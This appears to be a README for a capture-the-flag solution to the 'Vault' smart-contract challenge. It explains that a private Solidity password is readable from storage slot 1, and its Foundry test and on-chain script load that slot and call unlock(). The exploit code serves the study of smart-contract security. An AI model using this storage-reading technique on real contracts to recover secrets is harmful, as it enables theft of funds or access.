## 🎯 Objective:

- This contract objective is to get the password so that it can be passed as parameter, if the user passes the correct password then the `locked` will change the value to `false`.
- Private visibility is not Privacy.
---
## 📄Contracts Overview

### Vault
- This contract have 3 important variables:
	- `locked`: public visibility.
	- `password`: private visibility.
	- `Constructor`: pushes byte32 password and store it and set initial value of locked to be true.
	
		```solidity
		bool public locked;
		bytes32 private password;
		constructor(bytes32 _password) {
			locked = true;
			password = _password;
		}
		```
---
## 🧠Vulnerability: Vault

- The core vulnerability of this contract is even though it use a private visibility but still it can be seen by its storage slot and can be exploited.
- As per the contract a bytes32 type should be passed to the function unlock the vault.
	- If there is way to see the initial value of slots then it can be exploited.

```solidity
	constructor(bytes32 _password) {
		locked = true;
		password = _password;
	}
```

- As the there are `2 slot`:
	- `slot 0`: bool public locked
	- `slot 1`: bytes32 private password
- However solidity have a way to see through the storage slot.
	- `vm.load()`: This is the way through which a user can see the storage slots.
---
##  Attack Flow:

- To exploit this contract `vm.load()` can be used as it allow to user to see the storage slots
	- vm.load(<address(contract)>,<slot_number>);
```Attack
 As soon as the Target Contract is Deployed
  |
  V
  Uses vm.load()
  | attacker uses vm.load() with the target contract address and the slot number 
  | 
  V
  Vault.unlock()
  | call the unlock function with the result of the vm.load() function.
  V
  Which turns locked variable value to false.
```
- Even though the password variable is private but it still can be exploited.
---

- ## 🧪 Test - TestVault.t.sol

| TestName               | WhatitChecks                                                                |
| ---------------------- | --------------------------------------------------------------------------- |
| testLockedValueChanges | It checks whether it changes the initial value of `locked` parameter or not |
### Key exploit(in test):

```solidity
	
	bytes32 storageValue = vm.load(address(vault), bytes32(uint256(1)));
	
	initialLockedValue = vault.locked();
	console.log("This is the initilaValue of Locked", initialLockedValue);
	vault.unlock(storageValue);
	finalLockedValue = vault.locked();
	console.log("This is the FinalValue of Locker", finalLockedValue);
```
- The key exploit in this test file is:
	- `bytes32 storageValue = vm.load(address(vault), bytes32(uint256(1)));`
	- The vm.load() can see the slot1 and saves it in `bytes32 storageValue`.
	- Then it can be used as the parameter for the `unlock` function.
		- which changes the value of `Locked` Parameter.
		- Initially the value was `true`.
		- After calling the unlock function the value changes to `false`.
--- 
## 🚀On-Chain - AttackVaultScrip.s.sol

```solidity
function run() external {

	address instance = 0x040d1d7DA51A6C07Dc9dd6D122AC26a78d17dc6D;
	bytes32 password = vm.load(instance, bytes32(uint256(1)));
	console.log("The password is: ");
	console.logBytes32(password);
	vm.startBroadcast();
	Vault(instance).unlock(password);
	vm.stopBroadcast();
	}
```
- This script Automates 
	- this passes the `bytes32 password` as the parameter for the `unlock` function.
---

## 🛠 How to Run
### Run Tests (Local Anvil)

```bash
forge test --mt testLockedValueChanges -vvv
```

### Deploy & Attack (On-chain)

```bash
forge script script/AttackVaultScript.s.sol --rpc-url $RPC_SEPOLLIA_URL --private-key $PRIVATE_KEY --broadcast
```

- `vm.load()`: see's the storage slot and saves it.
	- it takes 2 parameter:
		- the address of the contract.
		- the storage slot number.

- `cast`:  It can also be used after deploying the contract. It is foundry tool that can be used to interact with the contract.
```bash
cast storage <Address_contract> <storage_slot_numner> --rpc-url $RPC_SEPOLLIA_URL --private-key $PRIVATE_KEY
```

---

## 📁 Project Structure

```
├── src/
│   └──Vault.sol      # unlock()
├── script/
│   ├── DeployScript.s.sol
│   └── AttackVault.s.sol
└── test/
    └── TestVault.t.sol
```



